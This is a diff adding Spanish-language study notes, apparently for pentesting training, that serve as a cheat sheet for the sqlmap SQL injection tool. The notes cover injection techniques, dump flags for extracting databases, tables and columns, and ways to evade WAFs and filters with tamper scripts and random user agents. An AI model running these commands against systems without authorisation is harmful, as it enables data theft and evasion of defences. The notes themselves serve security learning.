@@ -1,0 +1,79 @@
+	#### SQL map
+Consta con la capacidad de las siguientes tecnicas: B (Boolean based blind), E (Error based), U (Union query based), S (stacked queries), T (Time based blind), Q (Inline queries)
+
+	### GET
+sqlmap -u "<url/ip>"
+#SQLi basico con req GET
+
+	### POST
+sqlmap -u "<url/ip>" --data "<POST data>"
+#SQLI basico con req POST
+sqlmap -u "<url/ip>" --data "<POST data 1>*&<POST data 2>"
+#SQLi con req POST marcando la data 1 solo como parametro a probar
+#El * sirve para marcar en cualquier lado cuaal debe ser inyectado (ej. cookie)
+
+	### Global flags
+--answers="follow=Y" --batch
+#Yes to all questions
+-r <txt>
+#Permite importar la request desde un archivo txt
+--cookie="str"
+#Especifica una cookie parra hacer la request
+-H="str"
+#Para agregar un header
+-A=""
+#Para agregar un user agent
+--method <method>
+#Para especificar un metodo distinto a POST o GET
+
+--level
+#De 1 a 5, 1 default. Aumenta vectores y boundaries.
+--risk
+#De 1 a 3. 1 default. Aumenta vectores
+
+--prefix="str"
+#Agregar prefijo antes de las inyecciones
+--subfix="str"
+#Agregar un subfijo a la inyeccion
+
+	## Tecnicas
+--technique="letra"
+#letras = BEUSTQ
+--union-cols=int
+#Especifica cantidad de columnas con las que probar los payloads en un UNION
+
+	## Dump flags
+--batch --dump
+#Dumpea todo
+-D <DBName>
+#Especificar nombre de la DB a dumpear
+--tables -D x
+#Dumpea las tables de la DB X
+-D X -T <TableName>
+#Especificar nombre de la tabla de la cual dumpear todo
+-D X -T Y -C a,b
+#Dumpea de la DB X y Tabla Y, las columnas a y b
+--start=2 --stop=3
+#Comienza en la fila 2 y finaliza en la fila 3 de la tabla
+--where="name LIKE 'f%'"
+#Se establece un condicional para dumpear la info que matchee con el condicional
+--exclude-sysdbs
+#Permite excluir del dump las DB de sistemas. Tiene sentido usar esto si se usa la flagg --dump-all
+--schema
+#Muestra la estructura que poseen las tablas en una DB
+--search -T user
+#Sirve para enumerar mediante una palabra. En el ejemplo, se devolveria todas las DB que posean una tabla "user"
+
+	## Bypassing protections
+-u <ip>/?id=X&uid=xxrrandom --randomize=uid
+#Sirve para que UID (o cualquier otro parametro) sea random y sea tomado bien por la web app
+--data "id=1&token=ASD" --csrf-token=token
+#Si en POST es pasado un token, se debe especificar con la flag de arriba como se llama ese parametro
+--random-agent
+#SQLmap usa su propio user agent el cual puede ser bloqueado. Para evitar esto se puede hacer random dicho user agente
+--skip-waf
+#Sirve para producir menos ruido evitando la deteccion de waf's
+--tamper=between,randomcase
+#Muy necesario para bypasear cualquier tipo de bloqueo mediante palabras. Permrmite modiificar la request de (por ej) UNION a 0eunion
+#Mas info: https://academy.hackthebox.com/module/58/section/530
+
